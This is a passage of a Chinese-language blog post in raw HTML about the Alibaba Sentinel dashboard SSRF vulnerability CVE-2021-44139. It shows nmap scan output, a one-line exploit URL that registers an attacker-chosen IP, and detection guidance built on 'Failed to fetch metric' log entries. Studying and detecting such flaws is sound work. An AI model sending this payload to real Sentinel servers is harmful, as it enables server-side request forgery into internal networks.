class="hljs-number">23</span> <span class="hljs-title class_">Feb</span> <span class="hljs-number">2024</span> <span class="hljs-number">02</span>:<span class="hljs-number">50</span>:<span class="hljs-number">17</span> <span class="hljs-variable">GMT</span><br><span class="hljs-operator">|</span>     <span class="hljs-title class_">Connection</span>: <span class="hljs-variable">close</span><br><span class="hljs-operator">|</span>     <span class="hljs-operator">&lt;</span><span class="hljs-operator">!</span><span class="hljs-variable">doctype</span> <span class="hljs-variable">html</span><span class="hljs-operator">&gt;</span><br><span class="hljs-operator">|</span>     <span class="hljs-operator">&lt;</span><span class="hljs-variable">html</span> <span class="hljs-keyword">class</span><span class="hljs-operator">=</span><span class="hljs-string">&quot;no-js&quot;</span><span class="hljs-operator">&gt;</span><br><span class="hljs-operator">|</span>     <span class="hljs-operator">&lt;</span><span class="hljs-variable">head</span><span class="hljs-operator">&gt;</span><br><span class="hljs-operator">|</span>     <span class="hljs-operator">&lt;</span><span class="hljs-variable">meta</span> <span class="hljs-variable">charset</span><span class="hljs-operator">=</span><span class="hljs-string">&quot;utf-8&quot;</span><span class="hljs-operator">&gt;</span><br><span class="hljs-operator">|</span>     <span class="hljs-operator">&lt;</span><span class="hljs-variable">title</span><span class="hljs-operator">&gt;</span><span class="hljs-title class_">Sentinel</span> <span class="hljs-title class_">Dashboard</span><span class="hljs-operator">&lt;</span>/<span class="hljs-variable">title</span><span class="hljs-operator">&gt;</span><br><span class="hljs-operator">|</span>     <span class="hljs-operator">&lt;</span><span class="hljs-variable">meta</span> <span class="hljs-variable">name</span><span class="hljs-operator">=</span><span class="hljs-string">&quot;description&quot;</span> <span class="hljs-variable">content</span><span class="hljs-operator">=</span><span class="hljs-string">&quot;Sentinel </span><br><span class="hljs-string">|     ,Sentinel Dashboard,Admin&quot;</span><span class="hljs-operator">&gt;</span><br><span class="hljs-operator">|</span>     <span class="hljs-operator">&lt;</span><span class="hljs-variable">meta</span> <span class="hljs-variable">name</span><span class="hljs-operator">=</span><span class="hljs-string">&quot;viewport&quot;</span> <span class="hljs-variable">content</span><span class="hljs-operator">=</span><span class="hljs-string">&quot;width=device-width&quot;</span><span class="hljs-operator">&gt;</span><br><span class="hljs-operator">|</span>     <span class="hljs-operator">&lt;</span><span class="hljs-variable">link</span> <span class="hljs-variable">rel</span><span class="hljs-operator">=</span><span class="hljs-string">&quot;stylesheet&quot;</span> <span class="hljs-variable">href</span><span class="hljs-operator">=</span><span class="hljs-string">&quot;./lib/css/bootstrap.min.css&quot;</span> /<span class="hljs-operator">&gt;</span><br><span class="hljs-operator">|</span>     <span class="hljs-operator">&lt;</span><span class="hljs-variable">link</span> <span class="hljs-variable">rel</span><span class="hljs-operator">=</span><span class="hljs-string">&quot;stylesheet&quot;</span> <span class="hljs-variable">href</span><span class="hljs-operator">=</span><span class="hljs-string">&quot;./lib/css/font-awesome.min.css&quot;</span><span class="hljs-operator">&gt;</span><br><span class="hljs-operator">|</span>     <span class="hljs-operator">&lt;</span><span class="hljs-variable">link</span> <span class="hljs-variable">rel</span><span class="hljs-operator">=</span><span class="hljs-string">&quot;stylesheet&quot;</span> <span class="hljs-variable">href</span><span class="hljs-operator">=</span><span class="hljs-string">&quot;./dist/css/app.css&quot;</span><span class="hljs-operator">&gt;</span><br><span class="hljs-operator">|</span>     <span class="hljs-operator">&lt;</span><span class="hljs-variable">link</span> <span class="hljs-variable">rel</span><span class="hljs-operator">=</span><span class="hljs-string">&quot;icon&quot;</span> <span class="hljs-variable">type</span><span class="hljs-operator">=</span><span class="hljs-string">&quot;image/x-icon&quot;</span> <span class="hljs-variable">href</span><span class="hljs-operator">=</span><span class="hljs-string">&quot;/static/favicon.ico&quot;</span><span class="hljs-operator">&gt;</span><br><span class="hljs-operator">|</span>     <span class="hljs-operator">&lt;</span><span class="hljs-variable">base</span> <span class="hljs-variable">href</span><span class="hljs-operator">=</span><span class="hljs-string">&quot;./&quot;</span><span class="hljs-operator">&gt;</span><br><span class="hljs-operator">|</span>     <span class="hljs-operator">&lt;</span>/<span class="hljs-variable">head</span><span class="hljs-operator">&gt;</span><br><span class="hljs-operator">|</span>     <span class="hljs-operator">&lt;</span><span class="hljs-variable">body</span><span class="hljs-operator">&gt;</span><br><span class="hljs-operator">|</span>     <span class="hljs-operator">&lt;</span><span class="hljs-variable">div</span> <span class="hljs-variable">ng</span><span class="hljs-operator">-</span><span class="hljs-variable">app</span><span class="hljs-operator">=</span><span class="hljs-string">&quot;sentinelDashboardApp&quot;</span><span class="hljs-operator">&gt;</span><br><span class="hljs-operator">|</span>     <span class="hljs-operator">&lt;</span><span class="hljs-variable">div</span> <span class="hljs-variable">ui</span><span class="hljs-operator">-</span><span class="hljs-variable">view</span><span class="hljs-operator">&gt;</span><span class="hljs-operator">&lt;</span>/<span class="hljs-variable">div</span><span class="hljs-operator">&gt;</span><br><span class="hljs-operator">|</span>     <span class="hljs-operator">&lt;</span>/<span class="hljs-variable">div</span><span class="hljs-operator">&gt;</span><br><span class="hljs-operator">|</span>     <span class="hljs-operator">&lt;</span><span class="hljs-variable">script</span> <span class="hljs-variable">src</span><span class="hljs-operator">=</span><span class="hljs-string">&quot;./lib/js/jquery.min.js&quot;</span><span class="hljs-operator">&gt;</span><span class="hljs-operator">&lt;</span>/<span class="hljs-variable">script</span><span class="hljs-operator">&gt;</span><br><span class="hljs-operator">|</span>     <span class="hljs-operator">&lt;</span><span class="hljs-variable">script</span> <span class="hljs-variable">src</span><span class="hljs-operator">=</span><span class="hljs-string">&quot;./lib/js/b</span><br><span class="hljs-string">|   HTTPOptions: </span><br><span class="hljs-string">|     HTTP/1.1 200 </span><br><span class="hljs-string">|     Allow: GET,HEAD,OPTIONS</span><br><span class="hljs-string">|     Content-Length: 0</span><br><span class="hljs-string">|     Date: Fri, 23 Feb 2024 02:50:17 GMT</span><br><span class="hljs-string">|     Connection: close</span><br><span class="hljs-string">|   RTSPRequest, Socks4, Socks5: </span><br><span class="hljs-string">|     HTTP/1.1 400 </span><br><span class="hljs-string">|     Date: Fri, 23 Feb 2024 02:50:17 GMT</span><br><span class="hljs-string">|_    Connection: close</span><br><span class="hljs-string">|_http-open-proxy: Proxy might be redirecting requests</span><br><span class="hljs-string">|_http-title: Sentinel Dashboard</span><br><span class="hljs-string">1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :</span><br><span class="hljs-string">SF-Port8080-TCP:V=7.94%I=7%D=2/23%Time=65D807E9%P=arm-apple-darwin23.2.0%r</span><br><span class="hljs-string">SF:(GetRequest,46C,&quot;</span><span class="hljs-variable">HTTP</span>/<span class="hljs-number">1</span>\<span class="hljs-number">.1</span>\<span class="hljs-variable">x20200</span>\<span class="hljs-variable">x20</span>\<span class="hljs-variable">r</span>\<span class="hljs-variable">nLast</span><span class="hljs-operator">-</span><span class="hljs-title class_">Modified</span>:\<span class="hljs-variable">x20Thu</span>,\<span class="hljs-variable">x2022</span>\<span class="hljs-variable">x</span><br><span class="hljs-variable">SF</span>:<span class="hljs-number">20</span>Feb\<span class="hljs-variable">x202024</span>\<span class="hljs-variable">x2011</span>:<span class="hljs-number">38</span>:<span class="hljs-number">43</span>\<span class="hljs-variable">x20GMT</span>\<span class="hljs-variable">r</span>\<span class="hljs-variable">nAccept</span><span class="hljs-operator">-</span><span class="hljs-title class_">Ranges</span>:\<span class="hljs-variable">x20bytes</span>\<span class="hljs-variable">r</span>\<span class="hljs-variable">nContent</span><span class="hljs-operator">-</span><br><span class="hljs-variable">SF</span>:<span class="hljs-title class_">Type</span>:\<span class="hljs-variable">x20text</span>/<span class="hljs-variable">html</span>;<span class="hljs-variable">charset</span><span class="hljs-operator">=</span><span class="hljs-variable">UTF</span><span class="hljs-number">-8</span>\<span class="hljs-variable">r</span>\<span class="hljs-variable">nContent</span><span class="hljs-operator">-</span><span class="hljs-title class_">Language</span>:\<span class="hljs-variable">x20zh</span><span class="hljs-operator">-</span><span class="hljs-title class_">Hans</span><span class="hljs-operator">-</span><span class="hljs-variable">CN</span>\<span class="hljs-variable">r</span>\<span class="hljs-variable">n</span><br><span class="hljs-variable">SF</span>:<span class="hljs-title class_">Content</span><span class="hljs-operator">-</span><span class="hljs-title class_">Length</span>:\<span class="hljs-variable">x20901</span>\<span class="hljs-variable">r</span>\<span class="hljs-variable">nDate</span>:\<span class="hljs-variable">x20Fri</span>,\<span class="hljs-variable">x2023</span>\<span class="hljs-variable">x20Feb</span>\<span class="hljs-variable">x202024</span>\<span class="hljs-variable">x2002</span>:<span class="hljs-number">50</span>:<span class="hljs-number">1</span><br><span class="hljs-variable">SF</span>:<span class="hljs-number">7</span>\<span class="hljs-variable">x20GMT</span>\<span class="hljs-variable">r</span>\<span class="hljs-variable">nConnection</span>:\<span class="hljs-variable">x20close</span>\<span class="hljs-variable">r</span>\<span class="hljs-variable">n</span>\<span class="hljs-variable">r</span>\<span class="hljs-variable">n</span><span class="hljs-operator">&lt;</span><span class="hljs-operator">!</span><span class="hljs-variable">doctype</span>\<span class="hljs-variable">x20html</span><span class="hljs-operator">&gt;</span>\<span class="hljs-variable">n</span><span class="hljs-operator">&lt;</span><span class="hljs-variable">html</span>\<span class="hljs-variable">x20cl</span><br><span class="hljs-variable">SF</span>:ass<span class="hljs-operator">=</span>\<span class="hljs-string">&quot;no-js<span class="hljs-char escape_">\&quot;</span>&gt;<span class="hljs-char escape_">\n</span><span class="hljs-char escape_">\n</span>&lt;head&gt;<span class="hljs-char escape_">\n</span><span class="hljs-char escape_">\x20</span><span class="hljs-char escape_">\x20</span>&lt;meta<span class="hljs-char escape_">\x20</span>charset=<span class="hljs-char escape_">\&quot;</span>utf-8<span class="hljs-char escape_">\&quot;</span>&gt;<span class="hljs-char escape_">\n</span><span class="hljs-char escape_">\x20</span><span class="hljs-char escape_">\x20</span></span><br><span class="hljs-string">SF:&lt;title&gt;Sentinel<span class="hljs-char escape_">\x20</span>Dashboard&lt;/title&gt;<span class="hljs-char escape_">\n</span><span class="hljs-char escape_">\x20</span><span class="hljs-char escape_">\x20</span>&lt;meta<span class="hljs-char escape_">\x20</span>name=<span class="hljs-char escape_">\&quot;</span>descripti</span><br><span class="hljs-string">SF:on<span class="hljs-char escape_">\&quot;</span><span class="hljs-char escape_">\x20</span>content=<span class="hljs-char escape_">\&quot;</span>Sentinel<span class="hljs-char escape_">\x20</span>\xe6\x8e\xa7\xe5<span class="hljs-char escape_">\x88</span>\xb6\xe5\x8f\xb0,Sent</span><br><span class="hljs-string">SF:inel<span class="hljs-char escape_">\x20</span>Dashboard,Admin<span class="hljs-char escape_">\&quot;</span>&gt;<span class="hljs-char escape_">\n</span><span class="hljs-char escape_">\x20</span><span class="hljs-char escape_">\x20</span>&lt;meta<span class="hljs-char escape_">\x20</span>name=<span class="hljs-char escape_">\&quot;</span>viewport<span class="hljs-char escape_">\&quot;</span><span class="hljs-char escape_">\x20</span>conte</span><br><span class="hljs-string">SF:nt=<span class="hljs-char escape_">\&quot;</span>width=device-width<span class="hljs-char escape_">\&quot;</span>&gt;<span class="hljs-char escape_">\n</span><span class="hljs-char escape_">\n</span><span class="hljs-char escape_">\x20</span><span class="hljs-char escape_">\x20</span>&lt;link<span class="hljs-char escape_">\x20</span>rel=<span class="hljs-char escape_">\&quot;</span>stylesheet<span class="hljs-char escape_">\&quot;</span><span class="hljs-char escape_">\x20</span>hr</span><br><span class="hljs-string">SF:ef=<span class="hljs-char escape_">\&quot;</span>\./lib/css/bootstrap\.min\.css<span class="hljs-char escape_">\&quot;</span><span class="hljs-char escape_">\x20</span>/&gt;<span class="hljs-char escape_">\n</span><span class="hljs-char escape_">\x20</span><span class="hljs-char escape_">\x20</span>&lt;link<span class="hljs-char escape_">\x20</span>rel=<span class="hljs-char escape_">\&quot;</span>sty</span><br><span class="hljs-string">SF:lesheet<span class="hljs-char escape_">\&quot;</span><span class="hljs-char escape_">\x20</span>href=<span class="hljs-char escape_">\&quot;</span>\./lib/css/font-awesome\.min\.css<span class="hljs-char escape_">\&quot;</span>&gt;<span class="hljs-char escape_">\n</span><span class="hljs-char escape_">\x20</span><span class="hljs-char escape_">\x20</span>&lt;link</span><br><span class="hljs-string">SF:<span class="hljs-char escape_">\x20</span>rel=<span class="hljs-char escape_">\&quot;</span>stylesheet<span class="hljs-char escape_">\&quot;</span><span class="hljs-char escape_">\x20</span>href=<span class="hljs-char escape_">\&quot;</span>\./dist/css/app\.css<span class="hljs-char escape_">\&quot;</span>&gt;<span class="hljs-char escape_">\n</span><span class="hljs-char escape_">\x20</span><span class="hljs-char escape_">\x20</span>&lt;link</span><br><span class="hljs-string">SF:<span class="hljs-char escape_">\x20</span>rel=<span class="hljs-char escape_">\&quot;</span>icon<span class="hljs-char escape_">\&quot;</span><span class="hljs-char escape_">\x20</span>type=<span class="hljs-char escape_">\&quot;</span>image/x-icon<span class="hljs-char escape_">\&quot;</span><span class="hljs-char escape_">\x20</span>href=<span class="hljs-char escape_">\&quot;</span>/static/favicon\.ic</span><br><span class="hljs-string">SF:o<span class="hljs-char escape_">\&quot;</span>&gt;<span class="hljs-char escape_">\n</span><span class="hljs-char escape_">\x20</span><span class="hljs-char escape_">\x20</span>&lt;base<span class="hljs-char escape_">\x20</span>href=<span class="hljs-char escape_">\&quot;</span>\./<span class="hljs-char escape_">\&quot;</span>&gt;<span class="hljs-char escape_">\n</span>&lt;/head&gt;<span class="hljs-char escape_">\n</span><span class="hljs-char escape_">\n</span>&lt;body&gt;<span class="hljs-char escape_">\n</span><span class="hljs-char escape_">\x20</span><span class="hljs-char escape_">\x20</span>&lt;div\x</span><br><span class="hljs-string">SF:20ng-app=<span class="hljs-char escape_">\&quot;</span>sentinelDashboardApp<span class="hljs-char escape_">\&quot;</span>&gt;<span class="hljs-char escape_">\n</span><span class="hljs-char escape_">\x20</span><span class="hljs-char escape_">\x20</span><span class="hljs-char escape_">\x20</span><span class="hljs-char escape_">\x20</span>&lt;div<span class="hljs-char escape_">\x20</span>ui-view&gt;&lt;/d</span><br><span class="hljs-string">SF:iv&gt;<span class="hljs-char escape_">\n</span><span class="hljs-char escape_">\x20</span><span class="hljs-char escape_">\x20</span>&lt;/div&gt;<span class="hljs-char escape_">\n</span><span class="hljs-char escape_">\x20</span><span class="hljs-char escape_">\x20</span>&lt;script<span class="hljs-char escape_">\x20</span>src=<span class="hljs-char escape_">\&quot;</span>\./lib/js/jquery\.min\.js</span><br><span class="hljs-string">SF:<span class="hljs-char escape_">\&quot;</span>&gt;&lt;/script&gt;<span class="hljs-char escape_">\n</span><span class="hljs-char escape_">\x20</span><span class="hljs-char escape_">\x20</span>&lt;script<span class="hljs-char escape_">\x20</span>src=<span class="hljs-char escape_">\&quot;</span>\./lib/js/b&quot;</span>)<span class="hljs-operator">%</span><span class="hljs-title function_">r</span>(<span class="hljs-title class_">HTTPOptions</span>,<span class="hljs-number">75</span>,<span class="hljs-string">&quot;</span><br><span class="hljs-string">SF:HTTP/1\.1<span class="hljs-char escape_">\x20</span>200<span class="hljs-char escape_">\x20</span><span class="hljs-char escape_">\r</span><span class="hljs-char escape_">\n</span>Allow:<span class="hljs-char escape_">\x20</span>GET,HEAD,OPTIONS<span class="hljs-char escape_">\r</span><span class="hljs-char escape_">\n</span>Content-Length:\x</span><br><span class="hljs-string">SF:200<span class="hljs-char escape_">\r</span><span class="hljs-char escape_">\n</span>Date:<span class="hljs-char escape_">\x20</span>Fri,<span class="hljs-char escape_">\x20</span>23<span class="hljs-char escape_">\x20</span>Feb<span class="hljs-char escape_">\x20</span>2024<span class="hljs-char escape_">\x20</span>02:50:17<span class="hljs-char escape_">\x20</span>GMT<span class="hljs-char escape_">\r</span><span class="hljs-char escape_">\n</span>Connect</span><br><span class="hljs-string">SF:ion:<span class="hljs-char escape_">\x20</span>close<span class="hljs-char escape_">\r</span><span class="hljs-char escape_">\n</span><span class="hljs-char escape_">\r</span><span class="hljs-char escape_">\n</span>&quot;</span>)<span class="hljs-operator">%</span><span class="hljs-title function_">r</span>(<span class="hljs-title class_">RTSPRequest</span>,<span class="hljs-number">49</span>,<span class="hljs-string">&quot;HTTP/1\.1<span class="hljs-char escape_">\x20</span>400<span class="hljs-char escape_">\x20</span><span class="hljs-char escape_">\r</span><span class="hljs-char escape_">\n</span>Date:</span><br><span class="hljs-string">SF:<span class="hljs-char escape_">\x20</span>Fri,<span class="hljs-char escape_">\x20</span>23<span class="hljs-char escape_">\x20</span>Feb<span class="hljs-char escape_">\x20</span>2024<span class="hljs-char escape_">\x20</span>02:50:17<span class="hljs-char escape_">\x20</span>GMT<span class="hljs-char escape_">\r</span><span class="hljs-char escape_">\n</span>Connection:<span class="hljs-char escape_">\x20</span>clos</span><br><span class="hljs-string">SF:e<span class="hljs-char escape_">\r</span><span class="hljs-char escape_">\n</span><span class="hljs-char escape_">\r</span><span class="hljs-char escape_">\n</span>&quot;</span>)<span class="hljs-operator">%</span><span class="hljs-title function_">r</span>(<span class="hljs-title class_">FourOhFourRequest</span>,<span class="hljs-variable">B6</span>,<span class="hljs-string">&quot;HTTP/1\.1<span class="hljs-char escape_">\x20</span>401<span class="hljs-char escape_">\x20</span><span class="hljs-char escape_">\r</span><span class="hljs-char escape_">\n</span>Set-Cookie:</span><br><span class="hljs-string">SF:<span class="hljs-char escape_">\x20</span>sentinel_dashboard_cookie=BE654F45DE66F950E0710F8070194DEE;<span class="hljs-char escape_">\x20</span>Path</span><br><span class="hljs-string">SF:=/;<span class="hljs-char escape_">\x20</span>HttpOnly<span class="hljs-char escape_">\r</span><span class="hljs-char escape_">\n</span>Content-Length:<span class="hljs-char escape_">\x20</span>0<span class="hljs-char escape_">\r</span><span class="hljs-char escape_">\n</span>Date:<span class="hljs-char escape_">\x20</span>Fri,<span class="hljs-char escape_">\x20</span>23<span class="hljs-char escape_">\x20</span>Feb\x</span><br><span class="hljs-string">SF:202024<span class="hljs-char escape_">\x20</span>02:50:17<span class="hljs-char escape_">\x20</span>GMT<span class="hljs-char escape_">\r</span><span class="hljs-char escape_">\n</span>Connection:<span class="hljs-char escape_">\x20</span>close<span class="hljs-char escape_">\r</span><span class="hljs-char escape_">\n</span><span class="hljs-char escape_">\r</span><span class="hljs-char escape_">\n</span>&quot;</span>)<span class="hljs-operator">%</span><span class="hljs-title function_">r</span>(<span class="hljs-title class_">Socks</span>5,<span class="hljs-number">49</span><br><span class="hljs-variable">SF</span>:,<span class="hljs-string">&quot;HTTP/1\.1<span class="hljs-char escape_">\x20</span>400<span class="hljs-char escape_">\x20</span><span class="hljs-char escape_">\r</span><span class="hljs-char escape_">\n</span>Date:<span class="hljs-char escape_">\x20</span>Fri,<span class="hljs-char escape_">\x20</span>23<span class="hljs-char escape_">\x20</span>Feb<span class="hljs-char escape_">\x20</span>2024<span class="hljs-char escape_">\x20</span>02:50:1</span><br><span class="hljs-string">SF:7<span class="hljs-char escape_">\x20</span>GMT<span class="hljs-char escape_">\r</span><span class="hljs-char escape_">\n</span>Connection:<span class="hljs-char escape_">\x20</span>close<span class="hljs-char escape_">\r</span><span class="hljs-char escape_">\n</span><span class="hljs-char escape_">\r</span><span class="hljs-char escape_">\n</span>&quot;</span>)<span class="hljs-operator">%</span><span class="hljs-title function_">r</span>(<span class="hljs-title class_">Socks</span>4,<span class="hljs-number">49</span>,<span class="hljs-string">&quot;HTTP/1\.1<span class="hljs-char escape_">\x20</span>40</span><br><span class="hljs-string">SF:0<span class="hljs-char escape_">\x20</span><span class="hljs-char escape_">\r</span><span class="hljs-char escape_">\n</span>Date:<span class="hljs-char escape_">\x20</span>Fri,<span class="hljs-char escape_">\x20</span>23<span class="hljs-char escape_">\x20</span>Feb<span class="hljs-char escape_">\x20</span>2024<span class="hljs-char escape_">\x20</span>02:50:17<span class="hljs-char escape_">\x20</span>GMT<span class="hljs-char escape_">\r</span><span class="hljs-char escape_">\n</span>Conne</span><br><span class="hljs-string">SF:ction:<span class="hljs-char escape_">\x20</span>close<span class="hljs-char escape_">\r</span><span class="hljs-char escape_">\n</span><span class="hljs-char escape_">\r</span><span class="hljs-char escape_">\n</span>&quot;</span>);<br><br><span class="hljs-title class_">Service</span> <span class="hljs-variable">detection</span> <span class="hljs-variable">performed</span>. <span class="hljs-title class_">Please</span> <span class="hljs-variable">report</span> <span class="hljs-variable">any</span> incorrect <span class="hljs-variable">results</span> <span class="hljs-variable">at</span> <span class="hljs-variable">https</span>:<span class="hljs-comment">//nmap.org/submit/ .</span><br><span class="hljs-title class_">Nmap</span> <span class="hljs-variable">done</span>: <span class="hljs-number">1</span> <span class="hljs-variable">IP</span> <span class="hljs-title function_">address</span> (<span class="hljs-number">1</span> <span class="hljs-variable">host</span> <span class="hljs-variable">up</span>) <span class="hljs-variable">scanned</span> <span class="hljs-keyword">in</span> <span class="hljs-number">11.61</span> <span class="hljs-variable">seconds</span><br>➜  <span class="hljs-title class_">Alibaba</span>_Sentinel_SSRF_CVE<span class="hljs-number">-2021</span><span class="hljs-number">-44139</span> <br><br></code></pre></td></tr></table></figure><h4 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><p>payload:</p><p>h__p:&#x2F;&#x2F;ip&#x2F;registry&#x2F;machine?app&#x3D;40bdb&amp;appType&#x3D;0&amp;version&#x3D;0&amp;hostname&#x3D;VbxGe&amp;ip&#x3D;attackip&amp;port&#x3D;0</p><h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><h3 id="攻击排查"><a href="#攻击排查" class="headerlink" title="攻击排查"></a>攻击排查</h3><h4 id="服务日志"><a href="#服务日志" class="headerlink" title="服务日志"></a>服务日志</h4><p>攻击后服务会周期性访问payload中指定的ip和port组成的服务，可查询包含“Failed to fetch metric from”字符串的日志</p><p>测试过程中为 10.235.151.11:0</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-number">2024</span>-<span class="hljs-number">02</span>-<span class="hljs-number">23</span> <span class="hljs-number">10</span>:<span class="hljs-number">12</span>:<span class="hljs-number">12.108</span> ERROR <span class="hljs-number">14834</span> --- <span class="hljs-selector-attr">[O dispatcher 17]</span> c<span class="hljs-selector-class">.a</span><span class="hljs-selector-class">.c</span><span class="hljs-selector-class">.s</span><span class="hljs-selector-class">.dashboard</span><span class="hljs-selector-class">.metric</span><span class="hljs-selector-class">.MetricFetcher</span>   : Failed to fetch metric from &lt;http:<span class="hljs-comment">//10.235.151.11:0/metric?startTime=1708654313000&amp;endTime=1708654319000&amp;refetch=false&gt;: socket timeout</span><br><span class="hljs-number">2024</span>-<span class="hljs-number">02</span>-<span class="hljs-number">23</span> <span class="hljs-number">10</span>:<span class="hljs-number">13</span>:<span class="hljs-number">23.873</span> ERROR <span class="hljs-number">14834</span> --- <span class="hljs-selector-attr">[pool-3-thread-1]</span> c<span class="hljs-selector-class">.a</span><span class="hljs-selector-class">.c</span><span class="hljs-selector-class">.s</span><span class="hljs-selector-class">.dashboard</span><span class="hljs-selector-class">.metric</span><span class="hljs-selector-class">.MetricFetcher</span>   : Failed to fetch metric from &lt;http:<span class="hljs-comment">//10.235.151.11:0/metric?startTime=1708654320000&amp;endTime=1708654326000&amp;refetch=false&gt; (ConnectionException: Operation timed out)</span><br><span class="hljs-number">2024</span>-<span class="hljs-number">02</span>-<span class="hljs-number">23</span> <span class="hljs-number">10</span>:<span class="hljs-number">13</span>:<span class="hljs-number">29.864</span> ERROR <span class="hljs-number">14834</span> --- <span class="hljs-selector-attr">[pool-3-thread-1]</span> c<span class="hljs-selector-class">.a</span><span class="hljs-selector-class">.c</span><span class="hljs-selector-class">.s</span><span class="hljs-selector-class">.dashboard</span><span class="hljs-selector-class">.metric</span><span class="hljs-selector-class">.MetricFetcher</span>   : Failed to fetch metric from &lt;http:<span class="hljs-comment">//10.235.151.11:0/metric?startTime=1708654327000&amp;endTime=1708654333000&amp;refetch=false&gt; (ConnectionException: Operation timed out)</span><br><span class="hljs-number">2024</span>-<span class="hljs-number">02</span>-<span class="hljs-number">23</span> <span class="hljs-number">10</span>:<span class="hljs-number">13</span>:<span class="hljs-number">36.878</span> ERROR <span class="hljs-number">14834</span> --- <span class="hljs-selector-attr">[pool-3-thread-1]</span> c<span class="hljs-selector-class">.a</span><span class="hljs-selector-class">.c</span><span class="hljs-selector-class">.s</span><span class="hljs-selector-class">.dashboard</span><span class="hljs-selector-class">.metric</span><span class="hljs-selector-class">.MetricFetcher</span>   : Failed to fetch metric from &lt;http:<span class="hljs-comment">//10.235.151.11:0/metric?startTime=1708654334000&amp;endTime=1708654340000&amp;refetch=false&gt; (ConnectionException: Operation timed out)</span><br><span class="hljs-number">2024</span>-<span class="hljs-number">02</span>-<span class="hljs-number">23</span> <span class="hljs-number">10</span>:<span class="hljs-number">13</span>:<span class="hljs-number">43.857</span> ERROR <span class="hljs-number">14834</span> --- <span class="hljs-selector-attr">[pool-3-thread-1]</span> c<span class="hljs-selector-class">.a</span><span class="hljs-selector-class">.c</span><span class="hljs-selector-class">.s</span><span class="hljs-selector-class">.dashboard</span><span class="hljs-selector-class">.metric</span><span class="hljs-selector-class">.MetricFetcher</span>   : Failed to fetch metric from &lt;http:<span class="hljs-comment">//10.235.151.11:0/metric?startTime=1708654341000&amp;endTime=1708654347000&amp;refetch=false&gt; (ConnectionException: Operation timed out)</span><br><span class="hljs-number">2024</span>-<span class="hljs-number">02</span>-<span class="hljs-number">23</span> <span class="hljs-number">10</span>:<span class="hljs-number">13</span>:<span class="hljs-number">50.864</span> ERROR <span class="hljs-number">14834</span> --- <span class="hljs-selector-attr">[pool-3-thread-1]</span> c<span class="hljs-selector-class">.a</span><span class="hljs-selector-class">.c</span><span class="hljs-selector-class">.s</span><span class="hljs-selector-class">.dashboard</span><span class="hljs-selector-class">.metric</span><span class="hljs-selector-class">.MetricFetcher</span>   : Failed to fetch metric from &lt;http:<span class="hljs-comment">//10.235.151.11:0/metric?startTime=1708654348000&amp;endTime=1708654354000&amp;refetch=false&gt; (ConnectionException: Operation timed out)</span><br><span class="hljs-number">2024</span>-<span class="hljs-number">02</span>-<span class="hljs-number">23</span> <span class="hljs-number">10</span>:<span class="hljs-number">13</span>:<span class="hljs-number">57.904</span> ERROR <span class="hljs-number">14834</span> --- <span class="hljs-selector-attr">[pool-3-thread-1]</span> c<span class="hljs-selector-class">.a</span><span class="hljs-selector-class">.c</span><span class="hljs-selector-class">.s</span><span class="hljs-selector-class">.dashboard</span><span class="hljs-selector-class">.metric</span><span class="hljs-selector-class">.MetricFetcher</span>   : Failed to fetch metric from &lt;http:<span class="hljs-comment">//10.235.151.11:0/metric?startTime=1708654355000&amp;endTime=1708654361000&amp;refetch=false&gt; (ConnectionException: Operation timed out)</span><br><span class="hljs-number">2024</span>-<span class="hljs-number">02</span>-<span class="hljs-number">23</span> <span class="hljs-number">10</span>:<span class="hljs-number">14</span>:<span class="hljs-number">04.864</span> ERROR <span class="hljs-number">14834</span> --- <span class="hljs-selector-attr">[pool-3-thread-1]</span> c<span class="hljs-selector-class">.a</span><span class="hljs-selector-class">.c</span><span class="hljs-selector-class">.s</span><span class="hljs-selector-class">.dashboard</span><span class="hljs-selector-class">.metric</span><span class="hljs-selector-class">.MetricFetcher</span>   : Failed to fetch metric from &lt;http:<span class="hljs-comment">//10.235.151.11:0/metric?startTime=1708654362000&amp;endTime=1708654368000&amp;refetch=false&gt; (ConnectionException: Operation timed out)</span><br><span class="hljs-number">2024</span>-<span class="hljs-number">02</span>-<span class="hljs-number">23</span> <span class="hljs-number">10</span>:<span class="hljs-number">14</span>:<span class="hljs-number">11.860</span> ERROR <span class="hljs-number">14834</span> --- <span class="hljs-selector-attr">[pool-3-thread-1]</span> c<span class="hljs-selector-class">.a</span><span class="hljs-selector-class">.c</span><span class="hljs-selector-class">.s</span><span class="hljs-selector-class">.dashboard</span><span class="hljs-selector-class">.metric</span><span class="hljs-selector-class">.MetricFetcher</span>   : Failed to fetch metric from &lt;http:<span class="hljs-comment">//10.235.151.11:0/metric?startTime=1708654369000&amp;endTime=1708654375000&amp;refetch=false&gt; (ConnectionException: Operation timed out)</span><br><span class="hljs-number">2024</span>-<span class="hljs-number">02</span>-<span class="hljs-number">23</span> <span class="hljs-number">10</span>:<span class="hljs-number">14</span>:<span class="hljs-number">18.860</span> ERROR <span class="hljs-number">14834</span> --- <span class="hljs-selector-attr">[pool-3-thread-1]</span> c<span class="hljs-selector-class">.a</span><span class="hljs-selector-class">.c</span><span class="hljs-selector-class">.s</span><span class="hljs-selector-class">.dashboard</span><span class="hljs-selector-class">.metric</span><span class="hljs-selector-class">.MetricFetcher</span>   : Failed to fetch metric from &lt;http:<span class="hljs-comment">//10.235.151.11:0/metric?startTime=1708654376000&amp;endTime=1708654382000&amp;refetch=false&gt; (ConnectionException: Operation timed out)</span><br><br></code></pre></td></tr></table></figure><h4 id="控制台"><a href="#控制台" class="headerlink" title="控制台"></a>控制台</h4><p>检查 控制台-&gt;机器列表中是否存在未知异常的机器信息</p><h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><p>[1] Report a Sentinel Security Vulnerability about SSRF #2451 threedr3am Nov 18, 2021<br>链接：<a href="https://github.com/alibaba/Sentinel/issues/2451">https://github.com/alibaba/Sentinel/issues/2451</a></p><p>[2] Alibaba Sentinel SSRF漏洞(CVE-2021-44139)浅析 ordar 2022-08-30</p><p>链接：<a 